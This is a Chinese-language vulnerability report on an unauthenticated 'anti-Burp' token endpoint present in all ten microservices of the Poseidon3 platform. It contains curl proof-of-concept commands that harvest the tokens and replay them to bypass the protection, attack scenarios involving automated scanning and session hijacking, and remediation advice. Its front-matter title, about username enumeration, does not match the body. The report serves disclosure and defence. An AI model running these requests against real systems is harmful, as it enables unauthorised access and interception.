---
layout: about
category: about
Researchname: 「poseidon3」： 用户名枚举漏洞
toc: true
author: Bin4xin
permalink: /about/poseidon3-anti-burp-token-leakage/
desc: 「poseidon3」
---

# 防护Token泄露（全微服务）

{: .table}
| 字段 | 内容 |
|------|------|
| **报告编号** | VULN-OMS-2026-006 |
| **漏洞等级** | 中危 |
| **漏洞类型** | 安全机制绕过 (Security Mechanism Bypass) |
| **目标系统** | example-poseidon3.*****.com (Poseidon3企业应用平台) |
| **发现日期** | 2026-07-07 |
| **影响范围** | 全部10个微服务 |

---

## 1. 漏洞概述

Poseidon3企业应用平台的所有10个微服务均部署了防Burp Suite代理抓包的Token防护机制，接口路径为 `/{service}/inner/getPreventBurpToken`。然而该Token获取接口本身无需任何身份认证即可访问，攻击者可直接调用该接口获取防护Token，随后携带该Token绕过防护机制进行任意请求的代理抓包和重放攻击。这使得平台的防抓包防护机制形同虚设。该漏洞属于OWASP Top 10中A05:2021 - Security Misconfiguration类别。

---

## 2. 漏洞位置

### 2.1 接口地址

{: .table}
| 序号 | 服务名 | 服务标识 | 接口地址 |
|------|--------|----------|----------|
| 1 | 平台主服务 | platform-server | `GET /platform-server/inner/getPreventBurpToken` |
| 2 | 门户服务 | po-server | `GET /po-server/inner/getPreventBurpToken` |
| 3 | 报审服务 | pr-server | `GET /pr-server/inner/getPreventBurpToken` |
| 4 | 消息服务 | mb-server | `GET /mb-server/inner/getPreventBurpToken` |
| 5 | 结算服务 | kc-server | `GET /kc-server/inner/getPreventBurpToken` |
| 6 | 审批服务 | sp-server | `GET /sp-server/inner/getPreventBurpToken` |
| 7 | CA认证 | ca-server | `GET /ca-server/inner/getPreventBurpToken` |
| 8 | 标准管理 | stdmgt-server | `GET /stdmgt-server/inner/getPreventBurpToken` |
| 9 | 文件管理 | filemanage-server | `GET /filemanage-server/inner/getPreventBurpToken` |
| 10 | 文件处理 | filemanage-handle-server | `GET /filemanage-handle-server/inner/getPreventBurpToken` |

### 2.2 路径特征

- 所有接口路径均以 `/inner/` 开头，表明该接口设计上属于内部接口
- 但实际部署中未配置任何认证或网络访问控制
- 外部网络可直接访问所有 `/inner/` 路径的接口

---

## 3. 泄露内容分析

### 3.1 响应数据示例

以 `po-server` 为例：

```bash
curl -sk "https://example-poseidon3.*****.com/po-server/inner/getPreventBurpToken"
```

响应：

```json
{
  "code": "00000",
  "data": ["D8978798F2102282EF0AA1F3A****845"]
}
```

### 3.2 泄露字段解读

{: .table}
| 字段 | 内容 | 风险 |
|------|------|------|
| `code` | 状态码 `00000` 表示成功 | 低 |
| `data` | 防护Token数组，包含MD5格式的Token值 | 高 |

### 3.3 Token特征分析

{: .table}
| 特征 | 说明 |
|------|------|
| 格式 | 32位大写十六进制字符串（MD5） |
| 长度 | 固定32字符 |
| 时效性 | 需验证是否有时效限制 |
| 唯一性 | 需验证每个服务的Token是否独立生成 |

---

## 4. 漏洞验证

### 4.1 批量获取所有服务Token

```bash
# 逐个获取所有10个服务的防护Token
for svc in platform-server po-server pr-server mb-server kc-server \
           sp-server ca-server stdmgt-server filemanage-server \
           filemanage-handle-server; do
  echo "=== $svc ==="
  curl -sk "https://example-poseidon3.*****.com/$svc/inner/getPreventBurpToken"
  echo ""
done
```

### 4.2 携带Token绕过防护

```bash
# 获取Token
TOKEN=$(curl -sk "https://example-poseidon3.*****.com/po-server/inner/getPreventBurpToken" \
  | jq -r '.data[0]')

# 携带Token访问其他接口
curl -sk "https://example-poseidon3.*****.com/po-server/portal/member/login/getUserInfo" \
  -H "X-Prevent-Burp-Token: $TOKEN"
```

### 4.3 验证要点

- 所有请求均未携带任何认证Cookie、Session Token或JWT
- 服务端返回HTTP 200状态码，响应体包含有效Token
- 携带获取到的Token可正常访问受防护的接口

---

## 5. 攻击场景

### 5.1 绕过防抓包防护

```
1. 攻击者使用Burp Suite等代理工具拦截请求
2. 系统检测到代理特征，拒绝响应
3. 攻击者调用 getPreventBurpToken 获取有效Token
4. 将Token注入到后续请求的Header或Cookie中
5. 系统认为请求合法，正常响应
6. 攻击者可继续使用代理工具进行请求拦截和重放
```

### 5.2 自动化扫描绕过

```
1. 编写脚本先调用 getPreventBurpToken 获取Token
2. 将Token注入到扫描工具（如sqlmap、nikto）的请求中
3. 绕过防护机制后对系统进行自动化漏洞扫描
4. 发现更多潜在漏洞
```

### 5.3 会话劫持辅助

```
1. 获取防护Token
2. 结合代理抓包获取用户的Session Cookie
3. 使用Session Cookie和防护Token冒充合法用户
4. 访问用户的敏感数据和业务功能
```

### 5.4 全服务扫描

```
1. 遍历所有10个微服务的 getPreventBurpToken 接口
2. 收集所有服务的防护Token
3. 对每个服务分别进行渗透测试
4. 攻击面覆盖整个微服务架构
```

---

## 6. 根因分析

{: .table}
| 层级 | 问题 |
|------|------|
| **架构层** | 防护Token机制设计缺陷，Token获取接口与Token校验逻辑分离 |
| **设计层** | Token获取接口未做认证，形成"先有鸡还是先有蛋"的安全悖论 |
| **配置层** | `/inner/` 路径未配置网络访问控制或认证拦截 |
| **部署层** | 内部接口暴露在公网，未通过网络隔离保护 |

---

## 7. 影响评估

{: .table}
| 维度 | 影响 |
|------|------|
| **机密性** | 中 — 绕过防护后可使用代理工具抓取请求数据 |
| **完整性** | 中 — 绕过防护后可重放和篡改请求 |
| **可用性** | 低 — 不直接影响系统可用性 |
| **业务影响** | 高 — 整个平台的防抓包防护机制失效 |
| **攻击面** | 极广 — 影响全部10个微服务 |

---

## 8. 修复建议

### 8.1 紧急修复（P0）

1. **认证保护Token接口**：`getPreventBurpToken` 接口必须要求有效的登录Session或Token才能返回防护Token。
2. **网络访问控制**：`/inner/` 路径接口仅允许内网IP访问，通过Nginx/网关配置IP白名单。
3. **Token绑定**：将防护Token与用户的Session或IP地址绑定，防止Token被他人盗用。

### 8.2 短期修复（P1）

1. **Token时效性**：设置防护Token的过期时间（如5分钟），过期后需重新获取。
2. **Token一次性使用**：每个Token仅允许使用一次，使用后立即失效。
3. **请求签名机制**：使用HMAC签名替代简单Token，将请求参数和时间戳纳入签名计算，防止重放攻击。

### 8.3 长期加固（P2）

1. **重构防护机制**：取消独立的Token获取接口，改为在用户登录时一次性下发防护Token。
2. **WAF替代方案**：使用专业的WAF产品替代自研的防Burp机制，提供更可靠的防护能力。
3. **内网接口治理**：全面梳理 `/inner/` 路径接口，建立内部接口安全规范，确保所有内部接口不暴露在公网。
4. **API网关统一防护**：通过API网关统一实施请求签名校验、频率限制、IP白名单等防护措施。

---

## 9. 参考标准

- OWASP Top 10 2021: A05 - Security Misconfiguration
- CWE-306: Missing Authentication for Critical Function
- CWE-656: Relies on Security Through Obscurity
- GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求

---

**报告日期：** 2026-07-07